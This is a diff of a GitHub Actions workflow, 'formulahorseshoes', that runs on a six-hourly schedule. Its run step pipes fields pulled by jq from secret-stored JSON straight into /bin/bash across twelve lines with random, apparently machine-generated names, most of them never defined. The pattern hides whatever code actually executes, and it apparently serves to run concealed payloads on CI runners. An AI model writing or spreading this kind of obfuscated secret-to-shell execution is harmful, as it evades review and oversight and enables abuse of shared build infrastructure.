@@ -3,7 +3,7 @@ name: formulahorseshoes
 on:
   workflow_dispatch:
   schedule:
-    - cron: '35 2/6 * * *'
+    - cron: '36 5/6 * * *'
 
 jobs:
   build:
@@ -12,10 +12,18 @@ jobs:
       - uses: actions/checkout@v4
       - name: formulahorseshoes
         env:
-          kmfp0: ${{ secrets.kmfp0 }}
+          rmohv442: ${{ secrets.rmohv442 }}
         run: |
-          echo $kmfp0 | jq -r .j8495 | /bin/bash
-          echo $ypr88816 | jq -r .ijvpe2883 | /bin/bash
-          echo $znalo8511 | jq -r .lj5 | /bin/bash
-          echo $hilw4050 | jq -r .inq56 | /bin/bash
+          echo $rmohv442 | jq -r .uzwtw1 | /bin/bash
+          echo $qyf67843 | jq -r .vl0889 | /bin/bash
+          echo $qqnix59 | jq -r .cqks8 | /bin/bash
+          echo $vd1 | jq -r .an63 | /bin/bash
+          echo $f9 | jq -r .ebim4 | /bin/bash
+          echo $tfb2 | jq -r .tis36 | /bin/bash
+          echo $vo4 | jq -r .a03 | /bin/bash
+          echo $aq66 | jq -r .igyb28868 | /bin/bash
+          echo $hk0100 | jq -r .i2 | /bin/bash
+          echo $da6198 | jq -r .ymvh98467 | /bin/bash
+          echo $ku823 | jq -r .ivebf92026 | /bin/bash
+          echo $rcl1167 | jq -r .o37 | /bin/bash
 
